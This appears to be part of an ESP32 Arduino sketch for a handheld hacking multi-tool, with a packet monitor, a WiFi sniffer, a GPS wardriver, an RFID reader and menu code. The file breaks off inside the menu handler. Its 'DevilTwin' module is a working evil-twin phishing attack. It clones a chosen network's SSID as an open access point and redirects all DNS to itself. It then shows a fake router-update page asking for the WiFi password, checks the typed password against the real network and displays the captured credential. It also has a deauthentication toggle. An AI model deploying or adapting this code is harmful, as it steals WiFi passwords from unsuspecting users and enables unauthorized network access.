      // Serial.printf("\nFree RAM %u %u\n", heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT), heap_caps_get_minimum_free_size(MALLOC_CAP_32BIT));// for debug purposes

      pkts[MAX_X - 1] = tmpPacketCounter;

      draw();

      Serial.println((String)pkts[MAX_X - 1]);

      tmpPacketCounter = 0;
      deauths = 0;
      rssiSum = 0;
    }

    // Serial input
    if (Serial.available()) {
      ch = Serial.readString().toInt();
      if (ch < 1 || ch > 14)
        ch = 1;
      setChannel(ch);
    }
  }
}

void initPacketMon() {
  // Settings
  preferences.begin("packetmonitor32", false);
  ch = preferences.getUInt("channel", 1);
  preferences.end();

  // System & WiFi
  nvs_flash_init();
  // tcpip_adapter_init(); // Add header file for this function: #include <esp_wifi.h>
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  // ESP_ERROR_CHECK(esp_wifi_set_country(WIFI_COUNTRY_EU));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());

  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

  // SD card
  sdBuffer = Buffer();

  if (setupSD())
    sdBuffer.open(&SD_MMC);

  // I/O
  pinMode(BUTTON_PIN, INPUT_PULLUP);

  // display
#ifdef USE_DISPLAY
  // display.init();
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {  // Address 0x3C for 128x64
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;
  }

  /*#ifdef FLIP_DISPLAY
    display.flipScreenVertically();
  #endif
  */

  /* show start screen */
  display.fillScreen(SSD1306_BLACK);
  display.setTextColor(SSD1306_WHITE);
  // display.setFont(FreeMonoBold9pt7b); // Assuming you are using the FreeMonoBold9pt7b font
  display.setCursor(6, 6);
  display.print("PacketMonitor32");
  // display.setFont(FreeMonoBold9pt7b);
  display.setCursor(24, 34);
  display.print("Made with <3 by");
  display.setCursor(29, 44);
  display.print("@Spacehuhn");
  display.display();

  delay(1000);
#endif

  // second core
  xTaskCreatePinnedToCore(
    coreTask,      /* Function to implement the task */
    "coreTask",    /* Name of the task */
    2500,          /* Stack size in words */
    NULL,          /* Task input parameter */
    0,             /* Priority of the task */
    NULL,          /* Task handle. */
    RUNNING_CORE); /* Core where the task should run */

  esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous);
  esp_wifi_set_promiscuous(true);
}
void runPacketMon() {
  while (true) {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN)) {
      currentState = STATE_MENU;
      drawMenu();
      delay(500);  // Debounce delay
      return;
    }

    {
      vTaskDelay(portMAX_DELAY);
    }
  }
}
// start Wifi sniffer
#define LED_GPIO_PIN 26
#define WIFI_CHANNEL_SWITCH_INTERVAL (5000)
#define WIFI_CHANNEL_MAX (13)
uint8_t channel = 1;
//bool snifferRunning = true;

static wifi_country_t wifi_country = { .cc = "CN", .schan = 1, .nchan = 13 };  // Country configuration

typedef struct {
  unsigned frame_ctrl : 16;
  unsigned duration_id : 16;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  unsigned sequence_ctrl : 16;
  uint8_t addr4[6];
} wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} wifi_ieee80211_packet_t;

static void wifi_sniffer_set_channel(uint8_t channel);
static void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type);

void wifi_sniffer_init(void) {
  nvs_flash_init();
  ESP_ERROR_CHECK(esp_event_loop_create_default());
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  ESP_ERROR_CHECK(esp_wifi_init(&cfg));
  ESP_ERROR_CHECK(esp_wifi_set_country(&wifi_country));
  ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
  ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
  ESP_ERROR_CHECK(esp_wifi_start());
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&wifi_sniffer_packet_handler);
}

void wifi_sniffer_set_channel(uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

const char *wifi_sniffer_packet_type2str(wifi_promiscuous_pkt_type_t type) {
  return (type == WIFI_PKT_MGMT) ? "MGMT" : (type == WIFI_PKT_DATA) ? "DATA"
                                                                    : "MISC";
}

void wifi_sniffer_packet_handler(void *buff, wifi_promiscuous_pkt_type_t type) {
  if (!snifferRunning || type != WIFI_PKT_MGMT) return;

  const wifi_promiscuous_pkt_t *ppkt = (wifi_promiscuous_pkt_t *)buff;
  const wifi_ieee80211_mac_hdr_t *hdr = &((wifi_ieee80211_packet_t *)ppkt->payload)->hdr;
  char message[128];

  snprintf(message, sizeof(message), "TYPE=%s CHAN=%d RSSI=%d A1=%02x:%02x:%02x:%02x:%02x:%02x",
           wifi_sniffer_packet_type2str(type), ppkt->rx_ctrl.channel, ppkt->rx_ctrl.rssi,
           hdr->addr1[0], hdr->addr1[1], hdr->addr1[2], hdr->addr1[3], hdr->addr1[4], hdr->addr1[5]);

  Serial.println(message);
  printOnDisplay(message);
}

void initWifiSniffer() {
  wifi_sniffer_init();
  pinMode(LED_GPIO_PIN, OUTPUT);
}

void runWifiSniffer() {
  if (isButtonPressed(HOME_BUTTON_PIN)) {
    esp_wifi_set_promiscuous(false);
    currentState = STATE_MENU;
    drawMenu();
    delay(500);
    return;
  }

  if (isButtonPressed(SELECT_BUTTON_PIN)) {
    snifferRunning = !snifferRunning;
    display.clearDisplay();
    display.setCursor(0, 0);
    display.println(snifferRunning ? "Sniffer Running" : "Sniffer Paused");
    display.display();
    delay(500);
  }

  if (snifferRunning) {
    wifi_sniffer_set_channel(channel);
    channel = (channel % WIFI_CHANNEL_MAX) + 1;
    vTaskDelay(WIFI_CHANNEL_SWITCH_INTERVAL / portTICK_PERIOD_MS);
  } else {
    vTaskDelay(100 / portTICK_PERIOD_MS);
  }
}
// START DEVIL TWIN //
// DEVIL_TWIN VARIABLE SETUP //
typedef struct
{
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _DevilNetwork;

const uint8_t DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
WebServer webServer(80);

_DevilNetwork _devilnetworks[16];
_DevilNetwork _selectedNetwork;
// uses clearArry()
String _correct = "";
String _tryPassword = "";
String bytesToStr(uint8_t *data, uint8_t len) {
  String str = "";
  for (uint8_t i = 0; i < len; i++) {
    str += String(data[i], HEX);
    if (i < len - 1) {
      str += ":";
    }
  }
  return str;
}
void performDevilScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    Serial.println("Scanned Networks:");
    for (int i = 0; i < n && i < 16; ++i) {
      _DevilNetwork devilnetwork;
      devilnetwork.ssid = WiFi.SSID(i);
      Serial.print("SSID: ");
      Serial.println(devilnetwork.ssid);

      Serial.print("BSSID: ");
      for (int j = 0; j < 6; j++) {
        devilnetwork.bssid[j] = WiFi.BSSID(i)[j];
        Serial.print(devilnetwork.bssid[j], HEX);
        if (j < 5) {
          Serial.print(":");
        }
      }
      Serial.println();

      devilnetwork.ch = WiFi.channel(i);
      Serial.print("Channel: ");
      Serial.println(devilnetwork.ch);

      _devilnetworks[i] = devilnetwork;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect(true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
    WiFi.softAP("DevilTwin", "12345678");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    Serial.println("Good password was entered !");
    Serial.println(_correct);
  }
}

String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

void handleIndex() {
  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_devilnetworks[i].bssid, 6) == webServer.arg("ap")) {
        _selectedNetwork = _devilnetworks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("DevilTwin", "12345678");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if (_devilnetworks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _devilnetworks[i].ssid + "</td><td>" + bytesToStr(_devilnetworks[i].bssid, 6) + "</td><td>" + String(_devilnetworks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_devilnetworks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_devilnetworks[i].bssid, 6)) {
        _html += "<button style='background-color: #90ee90;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button>Select</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }

    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div></body></html>";
    webServer.send(200, "text/html", _html);
  } else {
    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updatedPassword:  ");
    }
  }
}
void initDevilTwin() {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFont(u8g2_font_baby_tf);
  u8g2_for_adafruit_gfx.setCursor(0, 10);
  u8g2_for_adafruit_gfx.print("DEVIL WIFI TWIN ");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("WEB UI = 192.168.4.1 ");
  u8g2_for_adafruit_gfx.setCursor(0, 30);
  u8g2_for_adafruit_gfx.print("WIFI - CypherTwin ");
  u8g2_for_adafruit_gfx.setCursor(0, 50);
  u8g2_for_adafruit_gfx.print("PW - 12345678 ");
  display.display();
  WiFi.mode(WIFI_AP_STA);
  delay(3000);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
  WiFi.softAP("CypherTwin", "12345678");
  delay(3000);
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
  delay(3000);
  performDevilScan();  // Add this line to perform the network scan
  delay(3000);
  Serial.println("scan complete");
  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  Serial.println("webserver started");
  // webServer.on("/admin", handleAdmin);
  webServer.onNotFound(handleIndex);
  webServer.begin();
  Serial.println("webserver begin, initdeviltwin done!");

  delay(3000);
}
void runDevilTwin() {
  Serial.println("runDevilTwin() strarting");
  while (true) {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN)) {
      currentState = STATE_MENU;
      drawMenu();
      delay(500);  // Debounce delay
      return;
    }
    webServer.handleClient();
    dnsServer.processNextRequest();
    delay(10);
  }
}

// *** GPS MODULES ***

// SETUP
// RTC setup
RTC_Millis rtc;
// Pin definitions for GPS module
static const int RXPin = 16, TXPin = 17;
static const uint32_t GPSBaud = 9600;  // GPS module baud rate
#define SD_CS_PIN 5                    // Chip select pin for SD card
#define MIN_SATELLITES 4               // Minimum number of satellites for a valid GPS fix
#define PST_OFFSET -8                  // PST is UTC-8
// Objects for GPS, serial communication, display, and SD card
TinyGPSPlus gps;
HardwareSerial gpsSerial(1);
File csvFile;
// Counters for WiFi scans and networks found
int scanCount = 0;
int networkCount = 0;
// GPS FUNCTIONS
void displayGPSData() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.print("Lat: ");
  display.println(gps.location.lat(), 6);
  display.print("Lng: ");
  display.println(gps.location.lng(), 6);
  display.print("Alt: ");
  display.println(gps.altitude.meters());
  display.print("Sat: ");
  display.println(gps.satellites.value());

  // Get the current time from RTC and display it
  DateTime now = rtc.now();
  char buffer[30];
  snprintf(buffer, sizeof(buffer), "%04d-%02d-%02d %02d:%02d:%02d", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  display.print("Time: ");
  display.println(buffer);

  // Display the number of networks found and scan count
  display.print("Nets: ");
  display.println(networkCount);
  display.print("Scans: ");
  display.println(scanCount);

  display.display();
}

// Display a message while searching for GPS signal
void displaySearching() {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println("Searching for GPS...");
  display.print("Satellites: ");
  display.println(gps.satellites.value());
  display.display();
}

// Display an error message on the OLED screen
void displayError(const char *error) {
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 0);
  display.println(error);
  display.display();
}

// Initialize a new CSV file for storing WiFi scan results
bool initializeCSV() {
  DateTime now = rtc.now();
  char filename[32];
  snprintf(filename, sizeof(filename), "/wigle_%04d%02d%02d_%02d%02d%02d.csv", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  csvFile = SD.open(filename, FILE_WRITE);
  if (csvFile) {
    csvFile.println("BSSID,SSID,Capabilities,First timestamp seen,Channel,Frequency,RSSI,Latitude,Longitude,Altitude,Accuracy,RCOIs,MfgrId,Type");
    csvFile.close();
    return true;
  }
  return false;
}

// Scan for WiFi networks and store results in the CSV file
void scanWiFiNetworks() {
  networkCount = WiFi.scanNetworks();  // Scan for WiFi networks
  scanCount++;                         // Increment scan count
  csvFile = SD.open("/wigle.csv", FILE_APPEND);
  if (csvFile) {
    for (int i = 0; i < networkCount; ++i) {
      writeNetworkData(i);
    }
    csvFile.close();
  } else {
    displayError("CSV Write Error");
  }

  // Print networks to serial monitor
  Serial.print("Scan #");
  Serial.println(scanCount);
  Serial.print("Networks found: ");
  Serial.println(networkCount);
  for (int i = 0; i < networkCount; ++i) {
    Serial.print("Network #");
    Serial.print(i + 1);
    Serial.print(": ");
    Serial.print(WiFi.SSID(i));
    Serial.print(" (");
    Serial.print(WiFi.RSSI(i));
    Serial.println(" dBm)");
  }
}

// Write network data to the CSV file
void writeNetworkData(int networkIndex) {
  String bssid = WiFi.BSSIDstr(networkIndex);
  String ssid = WiFi.SSID(networkIndex);
  String capabilities = WiFi.encryptionType(networkIndex) == WIFI_AUTH_OPEN ? "Open" : "Secured";
  String timestamp = getLocalTimestamp();
  int channel = WiFi.channel(networkIndex);
  int frequency = 2400 + (channel - 1) * 5;  // Assuming 2.4GHz WiFi
  int rssi = WiFi.RSSI(networkIndex);
  String latitude = String(gps.location.lat(), 6);
  String longitude = String(gps.location.lng(), 6);
  String altitude = String(gps.altitude.meters());
  String accuracy = String(gps.hdop.hdop());
  String rcois = "";   // Placeholder if RCOIs is not available
  String mfgrid = "";  // Placeholder if Manufacturer ID is not available
  String type = "WiFi";

  // Write network data to CSV file
  csvFile.print("\"" + bssid + "\",");
  csvFile.print("\"" + ssid + "\",");
  csvFile.print("\"" + capabilities + "\",");
  csvFile.print("\"" + timestamp + "\",");
  csvFile.print(channel);
  csvFile.print(",");
  csvFile.print(frequency);
  csvFile.print(",");
  csvFile.print(rssi);
  csvFile.print(",");
  csvFile.print(latitude);
  csvFile.print(",");
  csvFile.print(longitude);
  csvFile.print(",");
  csvFile.print(altitude);
  csvFile.print(",");
  csvFile.print(accuracy);
  csvFile.print(",");
  csvFile.print("\"" + rcois + "\",");
  csvFile.print("\"" + mfgrid + "\",");
  csvFile.println("\"" + type + "\"");
}
// Get the current timestamp from the RTC
String getLocalTimestamp() {
  DateTime now = rtc.now();  // Use RTC time for timestamp
  char buffer[30];
  snprintf(buffer, sizeof(buffer), "%04d-%02d-%02d %02d:%02d:%02d", now.year(), now.month(), now.day(), now.hour(), now.minute(), now.second());
  return String(buffer);
}

void initGPS() {
  display.clearDisplay();
  displayInfo("Loading GPS", "Initializing...");
  gpsSerial.begin(GPSBaud, SERIAL_8N1, RXPin, TXPin);  // Start GPS serial communication
  delay(5000);                                         // Allow time for the system to stabilize
  Serial.print("GPS loaded.");
  // Initialize OLED display
  // Initialize SD card
  //Serial.println("Initializing SD card...");
  /*
  if (!SD.begin(SD_CS_PIN)) {
      Serial.println("Initialization failed!");
  } else {
      Serial.println("Initialization done.");
      break
  }

  // delay(4000);
  //  Initialize CSV file
  if (!initializeCSV())
  {
    displayError("CSV Init Error");
  }
  else
  {
    Serial.println("CSV Initialization done.");
  }
  delay(3000);
  */

  rtc.begin(DateTime(F(__DATE__), F(__TIME__)));  // Initialize RTC with compile time
  displayInfo("GPS Loaded", "Wardriver Activated...");
}

void runGPS() {
  while (true) {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN)) {
      currentState = STATE_MENU;
      drawMenu();
      delay(500);  // Debounce delay
      return;
    }

    // Read GPS data
    while (gpsSerial.available() > 0) {
      gps.encode(gpsSerial.read());
    }

    // Check if GPS data is valid
    if (gps.location.isValid() && gps.hdop.isValid() && gps.date.isValid() && gps.time.isValid() && gps.satellites.value() >= MIN_SATELLITES) {
      // Update RTC with GPS time
      DateTime gpsTime(gps.date.year(), gps.date.month(), gps.date.day(), gps.time.hour(), gps.time.minute(), gps.time.second());
      rtc.adjust(gpsTime);

      // Display GPS data and scan for WiFi networks
      displayGPSData();
      scanWiFiNetworks();
      displayGPSData();
      delay(15000);  // Wait 15 seconds before next scan
    } else {
      displaySearching();
    }
  }
}

// *** TOOLS MODULES ***

// RFID START
#define RST_PIN 25
#define SS_PIN 27
MFRC522 mfrc522(SS_PIN, RST_PIN);
void drawBorder() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, SSD1306_WHITE);
}

void initRFID() {
  Serial.println("MFRC522 NFC Reader");
  displayInfo("MFRC522 NFC Reader", "Initializing...");
  SPI.begin();
  delay(2000);
  mfrc522.PCD_Init();
  delay(2000);
  mfrc522.PCD_DumpVersionToSerial();
  String fwVersion = "FW: " + String(mfrc522.PCD_ReadRegister(mfrc522.VersionReg), HEX);
  String chipInfo = "Chip: MFRC522";
  displayInfo("MFRC522 Info", chipInfo, fwVersion);
}


void readRFID() {
  while (true) {
    // Check if HOME_BUTTON is pressed
    if (isButtonPressed(HOME_BUTTON_PIN)) {
      currentState = STATE_MENU;
      drawMenu();
      delay(500);  // Debounce delay
      return;
    }

    if (!mfrc522.PICC_IsNewCardPresent()) {
      static unsigned long lastUpdate = 0;
      if (millis() - lastUpdate > 5000) {
        displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");
        lastUpdate = millis();
      }
      continue;
    }

    if (!mfrc522.PICC_ReadCardSerial()) {
      continue;
    }

    // Construct UID string and truncate if necessary
    String uidString = "";
    for (uint8_t i = 0; i < mfrc522.uid.size; i++) {
      uidString += (mfrc522.uid.uidByte[i] < 0x10 ? "0" : "") + String(mfrc522.uid.uidByte[i], HEX) + " ";
    }
    uidString.trim();
    if (uidString.length() > 20) uidString = uidString.substring(0, 17) + "...";

    // Get and truncate card type if necessary
    String typeString = mfrc522.PICC_GetTypeName(mfrc522.PICC_GetType(mfrc522.uid.sak));
    if (typeString.length() > 20) typeString = typeString.substring(0, 17) + "...";

    // Display the card information
    displayInfo("Card Detected", "UID: " + uidString, "Type: " + typeString, "Size: " + String(mfrc522.uid.size) + " bytes");

    Serial.println("Found card:");
    Serial.println(" UID: " + uidString);
    Serial.println(" Type: " + typeString);

    delay(3000);
    displayInfo("Ready", "Waiting for card...", "Place card near", "the reader");

    mfrc522.PICC_HaltA();
    mfrc522.PCD_StopCrypto1();
  }
}

bool readBlock(uint8_t blockAddr, uint8_t *buffer) {
  MFRC522::StatusCode status;
  uint8_t size = 18;

  status = mfrc522.MIFARE_Read(blockAddr, buffer, &size);
  if (status != MFRC522::STATUS_OK) {
    Serial.print(F("MIFARE_Read() failed: "));
    Serial.println(mfrc522.GetStatusCodeName(status));
    return false;
  }
  return true;
}

void handleReadBlock() {
  unsigned long lastDebounceTime = 0;
  const unsigned long debounceDelay = 200;
  uint8_t blockAddr = 4;  // Default block to read


  while (true) {
    displayInfo("Read Block", "Place card and", "press UP to read", "HOME to exit");

    // Check for exit condition
    if (digitalRead(HOME_BUTTON_PIN) == LOW) {
      if (millis() - lastDebounceTime > debounceDelay) {
        lastDebounceTime = millis();
        delay(1000);
        currentState = STATE_MENU;
        drawMenu();
        delay(500);  // Debounce delay
        break;
      }
    }

    // Check for read trigger
    if (digitalRead(UP_BUTTON_PIN) == LOW) {
      if (millis() - lastDebounceTime > debounceDelay) {
        lastDebounceTime = millis();

        if (mfrc522.PICC_IsNewCardPresent() && mfrc522.PICC_ReadCardSerial()) {
          uint8_t buffer[18];
          bool success = readBlock(blockAddr, buffer);
          if (success) {
            display.clearDisplay();
            display.setTextSize(1);
            display.setTextColor(SSD1306_WHITE);
            display.setCursor(0, 0);

            display.print("Block: ");
            display.println(blockAddr);
            display.println();  // Add a blank line for spacing

            String blockData = "";
            for (uint8_t i = 0; i < 16; i++) {
              blockData += (buffer[i] < 0x10 ? "0" : "") + String(buffer[i], HEX) + " ";

              // Print every 8 bytes in a new line for better readability
              if (i == 7) {
                display.println(blockData);
                blockData = "";  // Reset for the next line
              }
            }
            // Print any remaining data in blockData
            if (blockData.length() > 0) {
              display.println(blockData);
            }

            display.println();  // Add a blank line for spacing
            display.print("Press HOME to exit");

            display.display();  // Send the buffer to the display
            delay(5000);
          } else {
            display.clearDisplay();
            display.setTextSize(1);
            display.setTextColor(SSD1306_WHITE);
            display.setCursor(0, 0);

            display.print("Error: Failed to read");
            display.println();
            display.print("Block: ");
            display.println(blockAddr);

            display.println();  // Add a blank line for spacing
            display.print("Press SELECT to exit");

            display.display();  // Send the buffer to the display
            delay(2000);
          }
          mfrc522.PICC_HaltA();
          mfrc522.PCD_StopCrypto1();
        }
      }
    }
  }

  // Wait for button release
  while (digitalRead(SELECT_BUTTON_PIN) == LOW) {
    delay(10);
  }
}

// *** SYSTEM MODULES ***
// MENU
// LEDS SETUP
uint32_t getRandomColor() {
  return strip.Color(random(256), random(256), random(256));
}
void updateNeoPixel() {
  strip.setPixelColor(0, getRandomColor());
  strip.show();
  delay(200);                 // Keep the light on for 1000 milliseconds (1 second)
  strip.setPixelColor(0, 0);  // Turn off the pixel
  strip.show();               // Update the strip to show the change
}

void partyLight() {
  // Color rotation: red, green, blue, yellow, purple, cyan
  uint32_t colors[] = { strip.Color(255, 0, 0), strip.Color(0, 255, 0), strip.Color(0, 0, 255),
                        strip.Color(255, 255, 0), strip.Color(128, 0, 128), strip.Color(0, 255, 255) };
  int numColors = sizeof(colors) / sizeof(colors[0]);
  for (int i = 0; i < numColors; i++) {
    int brightness = 0;
    int fadeSpeed = 5 + (i * 2);  // Change speed based on color
    // Pulsate by increasing and decreasing brightness
    for (int j = 0; j <= 255; j += fadeSpeed) {
      brightness = j;
      setPixelColor(colors[i], brightness);
      delay(30);
    }
    for (int j = 255; j >= 0; j -= fadeSpeed) {
      brightness = j;
      setPixelColor(colors[i], brightness);
      delay(30);
    }
  }
}

// Helper function to set brightness by adjusting RGB values
void setPixelColor(uint32_t color, int brightness) {
  uint8_t r = (color >> 16) & 0xFF;
  uint8_t g = (color >> 8) & 0xFF;
  uint8_t b = color & 0xFF;
  strip.setPixelColor(0, strip.Color(
                           (r * brightness) / 255,
                           (g * brightness) / 255,
                           (b * brightness) / 255));
  strip.show();
}

void turnOffNeopixel() {
  strip.setPixelColor(0, 0);  // Turn off each pixel by setting it to black (0)
  strip.show();               // Update the NeoPixel strip
}

bool isButtonPressed(uint8_t pin) {
  if (digitalRead(pin) == LOW) {
    delay(100);  // Debounce delay
    if (digitalRead(pin) == LOW) {
      digitalWrite(LED_PIN, HIGH);  // Turn on LED
      return true;
    }
  }
  return false;
}

/**
 * Handles menu selection based on button presses.
 *
 * This function checks for button presses and updates the menu selection accordingly.
 * It also handles wrapping around the menu items and making the selected item visible.
 *
 * @return None
 */
void handleMenuSelection() {
  static bool buttonPressed = false;

  if (!buttonPressed) {
    if (isButtonPressed(UP_BUTTON_PIN)) {
      // Wrap around if at the top
      selectedMenuItem = static_cast<MenuItem>((selectedMenuItem == 0) ? (NUM_MENU_ITEMS - 1) : (selectedMenuItem - 1));

      if (selectedMenuItem == (NUM_MENU_ITEMS - 1)) {
        // If wrapped to the bottom, make it visible
        firstVisibleMenuItem = NUM_MENU_ITEMS - 2;
      } else if (selectedMenuItem < firstVisibleMenuItem) {
        firstVisibleMenuItem = selectedMenuItem;
      }

      Serial.println("UP button pressed");
      drawMenu();
      buttonPressed = true;
    } else if (isButtonPressed(DOWN_BUTTON_PIN)) {
      // Wrap around if at the bottom
      selectedMenuItem = static_cast<MenuItem>((selectedMenuItem + 1) % NUM_MENU_ITEMS);

      if (selectedMenuItem == 0) {
        // If wrapped to the top, make it visible
        firstVisibleMenuItem = 0;
      } else if (selectedMenuItem >= (firstVisibleMenuItem + 2)) {
        firstVisibleMenuItem = selectedMenuItem - 1;
      }

      Serial.println("DOWN button pressed");
      drawMenu();
      buttonPressed = true;
    } else if (isButtonPressed(SELECT_BUTTON_PIN)) {
      Serial.println("SELECT button pressed");
      executeSelectedMenuItem();
      buttonPressed = true;
    } else if (isButtonPressed(HOME_BUTTON_PIN)) {
      selectedMenuItem = static_cast<MenuItem>(0);
      firstVisibleMenuItem = 0;
      Serial.println("HOME button pressed");
      drawMenu();
      buttonPressed = true;
    }
  } else {
    // If no button is pressed, reset the buttonPressed flag
    if (!isButtonPressed(UP_BUTTON_PIN) && !isButtonPressed(DOWN_BUTTON_PIN) && !isButtonPressed(SELECT_BUTTON_PIN) && !isButtonPressed(HOME_BUTTON_PIN)) {
      buttonPressed = false;
      digitalWrite(LED_PIN, LOW);  // Turn off LED
    }
  }
}
// Menu Functions
void executeSelectedMenuItem() {
  switch (selectedMenuItem) {

    case PACKET_MON:
      Serial.println("PACKET button pressed");
      currentState = STATE_PACKET_MON;
      initPacketMon();
      delay(5000);
      runPacketMon();
      break;

    case WIFI_SNIFF:
      Serial.println("WIFI SNIFF button pressed");
      currentState = STATE_WIFI_SNIFFER;
      // test
      wifi_sniffer_init();
      delay(3000);
      runWifiSniffer();
      break;
    case AP_SCAN:
      Serial.println("AP SCAN button pressed");
      currentState = STATE_AP_SCAN;
      performScan();
      delay(2000);           // Scan for networks
      displayNetworkScan();  // Display the scanned networks
      break;
    case AP_JOIN:
      Serial.println("AP Join button pressed");
      currentState = STATE_AP_JOIN;
      startServer();
      delay(2000);
      break;
    case AP_CREATE:
      Serial.println("AP Create button pressed");
      currentState = STATE_AP_CREATE;
      startSoftAP();
      delay(2000);  // Scan for networks
